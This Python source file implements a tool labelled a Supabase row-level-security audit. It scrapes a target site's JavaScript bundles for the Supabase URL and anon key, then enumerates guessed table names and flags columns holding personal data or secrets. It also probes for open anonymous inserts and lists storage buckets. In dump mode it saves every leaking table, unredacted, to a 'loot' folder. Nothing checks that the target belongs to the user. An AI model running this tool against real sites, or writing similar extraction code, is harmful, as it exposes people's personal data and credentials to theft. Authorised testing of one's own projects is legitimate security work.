import base64
import json
import re
from pathlib import Path

import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

DEFAULT_TABLES = [
    "users", "user", "profiles", "profile", "accounts", "account",
    "members", "member", "memberships", "students", "teachers", "lecturers",
    "candidates", "applicants", "applications", "registrations", "registered_users",
    "registered_users_email", "registered_users_agg", "events", "event", "forms",
    "reviews", "comments", "posts", "replies", "messages", "chats", "feedback",
    "orders", "products", "items", "payments", "transactions", "invoices",
    "notifications", "reports", "submissions", "answers", "responses", "results",
    "roles", "user_roles", "permissions", "admins", "moderators", "teams",
    "departments", "organizations", "shifts", "sessions", "tokens", "api_keys",
    "llms", "agents", "datasource", "datasources", "integrations", "connections",
    "audit_log", "logs", "settings", "config", "secrets",
]

PII_HINTS = ("email", "phone", "name", "fullname", "full_name", "dob", "birth",
             "address", "cccd", "cmnd", "id_card", "student_id", "studentid",
             "ssn", "passport", "tax")
SECRET_HINTS = ("apikey", "api_key", "secret", "token", "password", "passwd",
                "connectionstring", "connection_string", "dsn", "privatekey",
                "private_key", "client_secret", "webhook")

JWT_RE = re.compile(r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+")
SUPA_URL_RE = re.compile(r"https://[a-z0-9]+\.supabase\.co")


def _b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def extract_from_bundle(target_url: str, timeout: int = 15):
    """Pull a Supabase URL + anon JWT out of a target's JS bundles."""
    base = target_url.rstrip("/")
    try:
        html = requests.get(base + "/", timeout=timeout, verify=False).text
    except requests.RequestException:
        html = ""
    chunks = re.findall(r'(?:src=")?(/(?:_next/static|assets|_app)[^"\']+\.js)', html)
    blobs = [html]
    for path in dict.fromkeys(chunks):
        try:
            blobs.append(requests.get(base + path, timeout=timeout, verify=False).text)
        except requests.RequestException:
            continue
    joined = "\n".join(blobs)
    urls = sorted(set(SUPA_URL_RE.findall(joined)))
    keys = [k for k in dict.fromkeys(JWT_RE.findall(joined)) if _jwt_role(k) == "anon"]
    return (urls[0] if urls else None), (keys[0] if keys else None)


def _jwt_role(jwt: str):
    try:
        payload = json.loads(_b64url_decode(jwt.split(".")[1]))
        return payload.get("role")
    except Exception:
        return None


class SupabaseAuditor:
    def __init__(self, url: str, anon_key: str, timeout: int = 12, verify_tls: bool = False):
        self.url = url.rstrip("/")
        self.anon = anon_key
        self.timeout = timeout
        self.verify = verify_tls
        self.headers = {"apikey": anon_key, "Authorization": f"Bearer {anon_key}"}
        self.ref = None
        self.role = None
        self._decode_jwt()

    def _decode_jwt(self):
        try:
            payload = json.loads(_b64url_decode(self.anon.split(".")[1]))
            self.ref = payload.get("ref")
            self.role = payload.get("role")
        except Exception:
            pass

    def _get(self, path, **kw):
        headers = {**self.headers, **kw.pop("headers", {})}
        return requests.get(self.url + path, headers=headers, timeout=self.timeout,
                            verify=self.verify, **kw)

    def count(self, table):
        """Return (http_code, row_count|None) for a table via the anon role."""
        try:
            r = self._get(f"/rest/v1/{table}?select=*&limit=1",
                          headers={**self.headers, "Prefer": "count=exact"})
        except requests.RequestException:
            return 0, None
        total = None
        cr = r.headers.get("content-range")
        if cr and "/" in cr and cr.split("/")[-1] != "*":
            try:
                total = int(cr.split("/")[-1])
            except ValueError:
                total = None
        return r.status_code, total

    def sample(self, table, limit=3):
        try:
            r = self._get(f"/rest/v1/{table}?select=*&limit={limit}")
            return r.json() if r.ok else []
        except (requests.RequestException, ValueError):
            return []

    def dump(self, table, page=1000):
        out, off = [], 0
        while True:
            try:
                r = self._get(f"/rest/v1/{table}?select=*&limit={page}&offset={off}")
                rows = r.json()
            except (requests.RequestException, ValueError):
                break
            if not isinstance(rows, list) or not rows:
                break
            out.extend(rows)
            if len(rows) < page:
                break
            off += page
        return out

    def write_probe(self, table):
        """Detect open anon INSERT with an empty payload (never persists data).

        An empty `{}` insert reaches Postgres only if RLS permits it; classify by
        the returned error code:
          - 23xxx (e.g. 23502 not-null, 23503 FK, 23505 unique) -> RLS PASSED the
            insert; it only failed a downstream constraint  => OPEN (dangerous).
          - 42501 ("row-level security policy") / 401 perm-denied  => LOCKED.
          - 201/200 -> the empty row actually persisted             => OPEN.
          - PGRST/parse errors -> INCONCLUSIVE (RLS not reached).
        """
        try:
            r = requests.post(self.url + f"/rest/v1/{table}", headers=self.headers,
                              timeout=self.timeout, verify=self.verify,
                              json={})
        except requests.RequestException:
            return "error", None
        body = (r.text or "")[:200]
        try:
            code = (r.json() or {}).get("code", "")
        except ValueError:
            code = ""
        if r.status_code in (200, 201):
            return "open", body
        if code == "42501" or "row-level security" in body or "permission denied" in body:
            return "locked", body
        if isinstance(code, str) and code.startswith("23"):
            return "open", body
        if code.startswith("PGRST") or r.status_code == 404:
            return "n/a", body
        return "n/a", body

    def gotrue_settings(self):
        try:
            r = requests.get(self.url + "/auth/v1/settings", headers={"apikey": self.anon},
                             timeout=self.timeout, verify=self.verify)
            return r.json() if r.ok else None
        except (requests.RequestException, ValueError):
            return None

    def list_buckets(self):
        try:
            r = self._get("/storage/v1/bucket")
            return r.json() if r.ok else None
        except (requests.RequestException, ValueError):
            return None


def _pii_columns(rows):
    if not rows or not isinstance(rows[0], dict):
        return []
    cols = rows[0].keys()
    return [c for c in cols if any(h in c.lower() for h in PII_HINTS)]


def _secret_columns(rows):
    if not rows or not isinstance(rows[0], dict):
        return []
    cols = rows[0].keys()
    return [c for c in cols if any(h in c.lower() for h in SECRET_HINTS)]


def _redact(value):
    if not isinstance(value, str) or not value:
        return value
    if "@" in value and "." in value.split("@")[-1]:
        u, d = value.split("@", 1)
        return u[:3] + "***@" + d
    if len(value) > 8:
        return value[:4] + "***" + value[-2:]
    return "***"


def supabase_audit_command(url, anon_key, tables=None, from_bundle=None,
                           dump=False, output_dir=None, timeout=12):
    if from_bundle:
        console.print(f"[cyan]Extracting Supabase creds from[/] {from_bundle}")
        f_url, f_key = extract_from_bundle(from_bundle, timeout)
        url = url or f_url
        anon_key = anon_key or f_key
        if not url or not anon_key:
            console.print("[red]Could not extract Supabase URL + anon key from bundle[/]")
            return
        console.print(f"[green]Found[/] {url}  key={anon_key[:12]}...")

    auditor = SupabaseAuditor(url, anon_key, timeout=timeout)
    console.print(Panel.fit(
        f"[bold]Supabase RLS audit[/]\nproject: {auditor.ref or '?'}\nrole: {auditor.role or '?'}\nurl: {auditor.url}",
        border_style="cyan"))
    if auditor.role and auditor.role != "anon":
        console.print(f"[yellow]Warning:[/] key role is '{auditor.role}', not 'anon' "
                      "(service_role would itself be a critical leak).")

    candidates = tables or DEFAULT_TABLES
    table = Table(title="Anon-readable tables", show_lines=False)
    table.add_column("table", style="bold")
    table.add_column("code", justify="right")
    table.add_column("rows", justify="right")
    table.add_column("PII/secret cols", style="red")
    table.add_column("write")

    findings = []
    for name in candidates:
        code, total = auditor.count(name)
        if code == 404 or code == 0:
            continue
        readable = code in (200, 206)
        flag_cols, sample = [], []
        if readable and (total is None or total > 0):
            sample = auditor.sample(name)
            flag_cols = _secret_columns(sample) + _pii_columns(sample)
        write_state, _ = auditor.write_probe(name)
        sev = ""
        if flag_cols and (total or 0) > 0:
            sev = "[red]LEAK[/]"
        elif readable and (total or 0) > 0:
            sev = "[yellow]read[/]"
        if write_state == "open":
            sev = (sev + " [red]+WRITE[/]").strip()
        if readable or write_state == "open":
            table.add_row(name, str(code), str(total if total is not None else "?"),
                          ",".join(flag_cols) or "-", write_state)
            findings.append({"table": name, "code": code, "rows": total,
                             "flag_cols": flag_cols, "write": write_state,
                             "sample": [{k: _redact(v) for k, v in r.items()} for r in sample[:2]]})

    console.print(table)

    crit = [f for f in findings if f["flag_cols"] and (f["rows"] or 0) > 0]
    writable = [f for f in findings if f["write"] == "open"]
    if crit:
        console.print(f"[bold red]CRITICAL[/] {len(crit)} table(s) leak PII/secrets to anon:")
        for f in crit:
            console.print(f"  - {f['table']}: {f['rows']} rows, cols={f['flag_cols']}")
            for s in f["sample"]:
                console.print(f"      {s}")
    if writable:
        console.print("[bold red]WRITE[/] anon INSERT permitted on: "
                      + ", ".join(f["table"] for f in writable))

    settings = auditor.gotrue_settings()
    if settings:
        ext = settings.get("external", {})
        providers = [k for k, v in ext.items() if v is True]
        console.print(f"[cyan]GoTrue[/] disable_signup={settings.get('disable_signup')} "
                      f"autoconfirm={settings.get('mailer_autoconfirm')} providers={providers}")
    buckets = auditor.list_buckets()
    if buckets:
        names = [b.get("name") for b in buckets] if isinstance(buckets, list) else buckets
        console.print(f"[cyan]Storage buckets[/] (listable by anon): {names}")

    if dump and crit:
        out = Path(output_dir or f"workers/{auditor.ref or 'supabase'}/loot")
        out.mkdir(parents=True, exist_ok=True)
        for f in crit:
            rows = auditor.dump(f["table"])
            dest = out / f"{f['table']}.json"
            dest.write_text(json.dumps(rows, ensure_ascii=False, indent=2))
            console.print(f"[green]dumped[/] {f['table']}: {len(rows)} rows -> {dest}")

    return findings
